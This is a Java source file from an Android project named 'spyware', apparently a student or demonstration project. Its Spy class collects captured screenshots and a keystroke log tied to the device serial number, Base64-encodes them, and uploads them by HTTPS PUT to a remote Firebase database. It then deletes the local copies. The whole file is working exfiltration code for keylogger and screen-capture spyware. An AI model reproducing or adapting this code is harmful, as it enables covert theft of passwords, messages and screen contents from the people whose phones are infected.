package com.example.cristianturetta.spyware;

import android.util.Base64;
import android.util.Log;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.Date;
import javax.net.ssl.HttpsURLConnection;

public class Spy {
    static private Spy mInstance;

    private Spy(){}

    public static Spy getInstance(){
        if (mInstance == null){
            synchronized (Spy.class){
                if (mInstance == null){
                    mInstance = new Spy();
                }
            }
        }
        return mInstance;
    }

    /**
     * Send recorded data to a remote Firebase database
     *
     */
    public void sendRecordedData(){
        try {
            FileUtil fileUtil = FileUtil.getInstance();
            String userIdentifier = android.os.Build.class.getField("SERIAL").get(null).toString();
            String rootDirectory = "/user/SERIAL_" + userIdentifier + "/SUBMITDATE_" + (new Date()).getTime();
            String screenshotSubFolder = rootDirectory + "/BASE64Screenshots" + ".json";
            String keypressSubFolder = rootDirectory + "/KEYPRESS" + ".json";

            JSONObject screenshotJSONObject = new JSONObject();
            URL screenshotURL = new URL(FirebaseConfig.getDatabaseURL() + screenshotSubFolder);
            HttpsURLConnection screenshotUrlConnection = getConnection(screenshotURL);
            ArrayList<File> screenshotFiles = fileUtil.getAllImagesFrom(fileUtil.getMalwareImagesStorageFolder());


            if(screenshotFiles != null && !screenshotFiles.isEmpty()) {

                for (File file : screenshotFiles) {
                    screenshotJSONObject.put(file.getName().replace(".","_").toLowerCase(), base64Encoding(file));
                }

                setPostRequestContent(screenshotUrlConnection, screenshotJSONObject);
                screenshotUrlConnection.connect();

                int responseCode = screenshotUrlConnection.getResponseCode();

                Log.d("Spy", "Database response code: " + responseCode);

                if(responseCode == 200){
                    fileUtil.deleteScreenshotFiles();
                    Log.d("Spy", "Screenshots deleted");
                }
                screenshotUrlConnection.disconnect();
            }

            JSONObject keypressJSONObject = new JSONObject();
            URL keypressURL = new URL(FirebaseConfig.getDatabaseURL() + keypressSubFolder);
            HttpsURLConnection keypressUrlConnection = getConnection(keypressURL);
            String keypressFileContent = fileUtil.getStringFromKeypressFile();

            if(keypressFileContent != null && !keypressFileContent.equals("")) {
                keypressJSONObject.put("Keylog", keypressFileContent);

                setPostRequestContent(keypressUrlConnection, keypressJSONObject);
                keypressUrlConnection.connect();

                int responseCode = keypressUrlConnection.getResponseCode();

                Log.d("Spy", "Database response code: " + responseCode);

                if(responseCode == 200){
                    fileUtil.deleteKeypressFile();
                    Log.d("Spy", "Keypress deleted");
                }
                keypressUrlConnection.disconnect();

            }





        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Adds to an {@link HttpsURLConnection} a {@link JSONObject} as request body
     *
     * @param conn connection to the database
     * @param jsonObject to insert into the body of the request
     * @throws IOException
     */
    private void setPostRequestContent(HttpsURLConnection conn, JSONObject jsonObject) throws IOException {
        OutputStream os = conn.getOutputStream();
        BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
        writer.write(jsonObject.toString());
        writer.flush();
        writer.close();
        os.close();
    }

    /**
     * Encodes a {@link File} in a Base64 {@link String}
     *
     * @param file to be encoded
     * @return corresponding Base64 {@link String}
     */
    private String base64Encoding(File file){
        try {
            byte[] content = new byte[(int) file.length()];
            FileInputStream inputStream = new FileInputStream(file);
            for (int off = 0, read; (read = inputStream.read(content, off, content.length - off)) > 0; off += read);
            return Base64.encodeToString(content, Base64.DEFAULT);
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "";
    }

    /**
     * Creates an {@link HttpsURLConnection}
     *
     * @param url to connect
     * @return corresponding {@link HttpsURLConnection} to the given {@link URL}
     */
    private HttpsURLConnection getConnection(URL url){
        HttpsURLConnection urlConnection = null;
        try {
            urlConnection = (HttpsURLConnection) url.openConnection();

            urlConnection.setRequestMethod("PUT");
            urlConnection.setDoOutput(true);
            urlConnection.setRequestProperty("Content-Type", "application/json");
            urlConnection.setRequestProperty("Accept", "application/json");

            return urlConnection;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return urlConnection;
    }
}
